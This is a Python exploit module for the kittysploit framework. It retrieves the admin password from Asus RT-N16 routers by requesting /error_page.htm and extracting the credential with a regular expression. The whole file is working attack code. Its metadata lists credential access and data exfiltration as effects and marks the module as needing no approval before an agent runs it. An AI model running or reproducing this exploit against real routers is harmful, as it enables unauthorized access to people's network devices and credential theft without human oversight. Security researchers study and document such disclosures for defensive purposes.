#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Asus RT-N16 Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Asus RT-N16 Password Disclosure',
        'description': 'Module exploits password disclosure vulnerability in Asus RT-N16 devices that allows to fetch credentials for the device.',
        'author': ['Harry Sintonen', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://sintonen.fi/advisories/asus-router-auth-bypass.txt'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/error_page.htm",
        )
        if response is None:
            return

        creds = re.findall(r"if\('1' == '0' \|\| '(.+?)' == 'admin'\)", response.text)

        if len(creds):
            c = [("admin", creds[0])]
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *c)
        else:
            print_error("Credentials could not be found")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/error_page.htm",
        )
        if response is None:
            return False  # target is not vulnerable

        creds = re.findall(r"if\('1' == '0' \|\| '(.+?)' == 'admin'\)", response.text)

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
